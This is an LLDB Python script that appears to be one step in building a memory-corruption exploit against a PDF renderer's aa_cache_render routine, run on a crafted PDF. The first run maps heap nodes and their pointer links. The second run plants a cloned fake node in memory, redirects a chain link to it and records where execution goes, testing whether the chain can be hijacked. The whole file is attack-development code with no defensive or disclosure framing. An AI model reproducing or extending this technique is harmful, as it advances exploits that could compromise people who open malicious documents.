# RIP-17: chain-hijack recon + manual-hijack mechanism test.
# RUN-1: at each walk stop, node addr = x27 - x16; dump qwords -> find pool-pointer
# links (0x12f-class). RUN-2: plant fake node (copy of real node) at x27-0x4000,
# overwrite a chain link with fake ptr, continue -> walk follows = HIJACK MECHANISM.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip17_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def rd(p, addr, n):
    return p.ReadMemory(addr, n, err) if err.Success() or True else None

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

L = 31472
PDF = "k2_d%d.pdf" % L
# RUN-1: chain recon
bpe = t.BreakpointCreateByName("aa_cache_render")
p = t.LaunchSimple([PDF, "r.png"], None, CWD)
th = p.GetSelectedThread()
pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
bpw = t.BreakpointCreateByAddress(pc + 1804)
nodes = []
x27 = 0
for i in range(14):
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
    if st != lldb.eStateStopped: break
    fr = p.GetSelectedThread().GetSelectedFrame()
    x27 = fr.FindRegister("x27").GetValueAsUnsigned()
    x16 = fr.FindRegister("x16").GetValueAsUnsigned()
    if x16 and x16 < 0x10000:
        naddr = x27 - x16
        qs = qwords(p, naddr, 24)
        pshape = [(j, hex(q)) for j, q in enumerate(qs or []) if 0x100000000 <= q < 0x800000000000]
        nodes.append((i, x27, x16, naddr, pshape))
        T("stop%02d node=%x ptrqwords=%s" % (i, naddr, pshape))
p.Kill(); t.BreakpointDelete(bpw.GetID()); t.BreakpointDelete(bpe.GetID())
T("RUN-1 nodes: %d" % len(nodes))

# RUN-2: manual hijack — at stop2 (3rd level), overwrite the node's first pool-ptr
# qword to point at planted fake node (copy of node bytes) at x27-0x4000.
if len(nodes) >= 4:
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple([PDF, "r.png"], None, CWD)
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    stops = 0
    for i in range(6):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
        x16 = fr.FindRegister("x16").GetValueAsUnsigned()
        stops += 1
        if stops == 5 and x16 and x16 < 0x10000:
            naddr = x27 - x16
            node = p.ReadMemory(naddr, 0x180, err)
            T("run2 stop5 node=%x read=%s" % (naddr, err.Success()))
            if err.Success() and node:
                fake = x27 - 0x4000
                wr(p, fake, node)                       # plant clone
                qs = qwords(p, naddr, 24)
                link = None
                for j, q in enumerate(qs or []):
                    if 0x100000000 <= q < 0x800000000000:
                        link = (naddr + j*8, q); break
                if link:
                    T("run2 link @%x = %x -> redirect to %x" % (link[0], link[1], fake))
                    struct.pack_into('<Q', node := bytearray(p.ReadMemory(link[0], 8, err)), 0, fake)
                    ok = wr(p, link[0], bytes(node))
                    T("run2 link patched: %s" % ok)
                    # continue and watch where the walk goes
                    p.Continue()
                    st = p.GetState()
                    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
                    if st == lldb.eStateStopped:
                        th2 = p.GetSelectedThread()
                        fr2 = th2.GetSelectedFrame()
                        off = -1
                        if fr2.GetSymbol():
                            off = fr2.GetPCAddress().GetLoadAddress(t) - fr2.GetSymbol().GetStartAddress().GetLoadAddress(t)
                        T("run2 post-hijack stop: +%d %s" % (off, (th2.GetStopDescription(200) or "?")[:100]))
                        fa = 0
                        desc = th2.GetStopDescription(300) or ""
                        if "address=" in desc:
                            try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                            except Exception: pass
                        T("run2 post-hijack fa=%x (fake=%x)" % (fa, fake))
                        x27b = fr2.FindRegister("x27").GetValueAsUnsigned()
                        x16b = fr2.FindRegister("x16").GetValueAsUnsigned()
                        T("run2 post x27=%x x16=%x" % (x27b, x16b))
                        p.Kill()
                    else:
                        T("run2 post-hijack: process exited rc=%s" % p.GetExitStatus())
            break
    p.Kill() if p.GetState() in (lldb.eStateStopped, lldb.eStateRunning) else None
    t.BreakpointDelete(bpw.GetID()); t.BreakpointDelete(bpe.GetID())
T("RIP-17 DONE")
TRACE.close()
